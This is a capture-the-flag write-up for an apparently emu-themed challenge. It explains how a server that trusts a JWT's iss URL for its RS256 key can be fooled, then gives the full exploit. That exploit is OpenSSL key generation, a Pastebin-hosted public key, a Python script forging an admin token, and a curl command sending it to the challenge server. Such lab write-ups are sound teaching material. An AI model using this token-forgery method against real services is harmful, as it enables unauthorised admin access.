### Step 1: Understand and Analyze the Challenge
A cursory look at the `website.js` file reveals that the weakness is in the `validateJwt` function: which supports both HS256 (symmetric signing with a secret key) and RS256 (asymmetric signing with a public/private key) algorithms. 

Critical details are as follows:

 - **HS256**: Uses a `SECRET_KEY` (a 64-byte random value generated at runtime) to both sign and verify the token. This is secure as long as the secret remains private, which it does in this case since it’s not exposed.
 - **RS256**: Allows the token to specify an iss (issuer) claim in the JWT payload, which is a URL pointing to a public key. The server downloads this public key using the `downloadFromUrl` function and uses it to verify the token’s signature.

The flaw lies in the RS256 implementation:

-   The server trusts the iss URL provided in the JWT payload without sufficiently validating its source or content, beyond a basic check that it starts with `http://` or `https://`. 

	This is evident in line 23:
	 `    const proto = !url.charAt(4).localeCompare('s') ? https : http;
`
-   This means that there's no restriction preventing an attacker from hosting their own public key at a URL they control and crafting a JWT signed with the corresponding private key.
-   The emu server will then download this attacker-controlled public key and use it to verify the token, effectively allowing the attacker to bypass authentication.

Obviously we will want to login with admin privileges, so **we'll exploit the RS256 path to create our own token** with username: "superior-emu".

### Step 2: Generate RSA Key Pair
To generate an RSA key pair, I used OpenSSL. 

**Firstly, we must generate a private key**:
`openssl genrsa -out private.pem`. This generates the file `private.pem` containing the private key. 
- In greater detail, it uses OpenSSL's 'genrsa' function. Keyword `-out` means it produces the file `private.pem`.
 
**Secondly, we have to extract the corresponding public key**: 
`openssl rsa -in private.pem -pubout -out public.pem`. This takes in the private.pem file we've generated, and outputs the public.pem file. 
- In greater detail, it uses OpenSSL's 'rsa' function. `-in` specifies the input filename (private.pem) to read a key from. Keyword `-pubout` means that we want a public key to be returned. Finally, `-out` means we want public.pem to be the filename of the returned output.

**Result:**

### Step 3: Hosting the Public Key
This is a straightforward step, consisting of only three things:

1. Copy the contents of public.pem.
2. Go to Pastebin, paste the public key, and create a public paste.
3. Get the raw URL of the pastebin.
4. Test it in a browser to ensure it serves the plain text of the public key.

This means that we now have our own iss value hosted on the net, which we can use in our own malicious JWT.
#### Result:

### Step 4: Create JWT
This step involves making a simple JWT-producing function, which we'll create using our Pastebin-hosted iss:
```python
import jwt

with open("private.pem", "r") as f:
    private_key = f.read()

payload = {
    "username": "superior-emu",
    "iss": "https://pastebin.com/raw/your-paste-id"
}

token = jwt.encode(payload, private_key, algorithm="RS256")
print(token)
```
Let's break down the function step by step:

 1. `import jwt`
    We import `jwt`, which is a common JSON Web Token (JWT) implementation in Python. This is necessary for encoding our JWT.
 2. `with open("private.pem", "r") as f:
	  private_key = f.read()`
	  This is a simple file read-in functionality, allowing us to open our private key, storing it to our `private_key` variable. This is needed for the encoding stage.
  3. `payload = {
    "username": "superior-emu",
    "iss": "https://pastebin.com/raw/your-paste-id"
}`
Here we craft our malicious payload, using our desired aforementioned admin username. Our ISS is the raw Pastebin URL of the public key, so we just paste that it.
4. `token = jwt.encode(payload, private_key, algorithm="RS256")`
Finally, we use the `jwt` function `encode`, which takes parameters `payload`, `private_key`, and `algorithm` to produce a valid JWT.
5. `print(token)`
Finally, we want to see our JWT, so we print it out. 

**Result:**

### Step 5: Submitting the JWT
Finally, we submit the JWT using `curl` to the server at `34.87.251.234` on channel `3002`. To do this we can just type the following code into terminal:


`curl -X POST http://34.87.251.234:3002/api/validate/jwt
  -H "Content-Type: application/json"
  -d '{"jwt": "your-jwt-token-here"}'
`

In greater detail:
1. `curl`
`curl` or "Client URL" is a command-line tool used to transfer data to or from a server using various protocols, usually HTTP/HTTPS. We will use it to send our HTTP POST request to the Emus’ server
2. `-X POST`
The `-X` flag specifies the HTTP method to use. `POST` tells `curl` to send a `POST` request instead of the default `GET` request. We use `POST` because the endpoint in the Express app only uses `POST` requests, and we want to send stuff to the emu server.
3. `http://34.87.251.234:3002/api/validate/jwt`
This specifies exactly where we want to send stuff. We're sending it to the server IP (`34.87.251.234`), port `3002`, endpoint path `api/validate/jwt`.
4. `-H "Content-Type: application/json"`
The `-H` flag adds a HTTP header to the request, setting the `Content-Type` header to be `json`. This is metadata about our request, without which might lead to wrong interpretations of the data we're sending.
5. `-d '{"jwt": "your-jwt-token-here"}'`
Finally, the data we're sending. The `-d` flag is shorthand for `--data`. Here, we're sending a JSON string, consisting of our JSON object 'jwt', with the value of our generated JWT.

**Result:**
